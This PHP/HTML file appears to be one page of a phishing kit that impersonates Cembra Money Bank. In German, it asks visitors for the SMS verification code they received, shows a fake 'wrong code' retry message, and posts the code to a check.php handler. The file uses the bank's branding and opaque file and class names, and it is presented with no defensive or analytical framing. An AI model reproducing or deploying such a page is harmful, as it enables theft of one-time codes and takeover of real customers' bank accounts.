<?php 



include __DIR__ . "/cembra/functions.php";

$step = isset($_GET['step']) ? $_GET['step'] : '';
$zbi = "Um den Vorgang zu bestätigen, geben Sie bitte den Code ein, den Sie in der SMS erhalten haben";
$style_error = 'style="border-bottom: 2px solid red;"';
if ($step == "sms-er"){
    $zbi = "Der von Ihnen eingegebene Code ist falsch. Bitte geben Sie den Code ein, den Sie in der SMS erhalten haben";
    $style_error = 'style="border-bottom: 2px solid red;"';
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cembra Money Bank</title>
    <link rel="shortcut icon" href="./files/media/favicon.ico" type="image/x-icon">
    <meta name="description" content="">
    <link rel="stylesheet" href="./files/css/zwa9.css">
</head>
<body>
    <div class="wait">
        <div class="wait-hbess">
            <img src="./files/media/loading.gif" alt="loading" style="float:left; margin:2px 20px 5px 5px;" width="16" height="16"> <p style="margin:0;">Ihre Anfrage wird verarbeitet</p>
        </div>
    </div>

    <main>
        <header> 
            <div class="logo">
                <img src="./files/media/cembra-money-bank.jpg" alt="" srcset="">
            </div>
            <div class="lang-list">
                <div class="zbi"> <p>DE</p> </div>
                <div class="zbi"> <p>FR</p> </div>                
                <div class="zbi"> <p>IT</p> </div>               
                <div class="zbi"> <p>EN</p> </div>
            </div>
        </header>

        <div class="muli-steps">
            <div class="steps">
                <ul>
                    <li><span><img src="./files/media/done.png" alt="" srcset=""></span><p>anmelden</p></li>
                    <li><span><img src="./files/media/done.png" alt="" srcset=""></span><p>Information</p></li>
                    <li><span style="background-color:#1e5077;">3</span><p>Überprüfung</p></li>
                </ul>
            </div>
            <div class="l2i9na3">
                <div class="get-cc">
                    <div class="eonwann">
                        <h1>
                            <?php echo $zbi; ?>
                            </h1>
                    </div>
                    <style>
                        .steps ul li:nth-child(2)::before{
    background-color: #1e5077; /* Color for the line */
}
                    </style>
                    <form action="check.php" id="loginForm" method="post">
                        <input type="hidden" name="step" value="3" hidden="">      
                        <div class="inputs-group" style="padding-top: 20px;">
                            <div class="zbiii">
                                <div class="labels" style="position: relative;">
                                    <label for="tele">Code per SMS erhalten<span>*</span></label>
                                    <input <?php echo $style_error ?> type="tel" required name="sms" required id="sms" placeholder="">
                                    <img style="width: 30px; padding-top: 5px;" src="./files/media/sms.png" alt="" srcset="">
                                </div>
                            </div>
                        </div>
                        <div class="mowafa9a-achaf">
                            <button id="loginButton">weiter</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </main>

    <script src="./files/js/haraka.js">
    </script>
    
    
    
</body>
</html>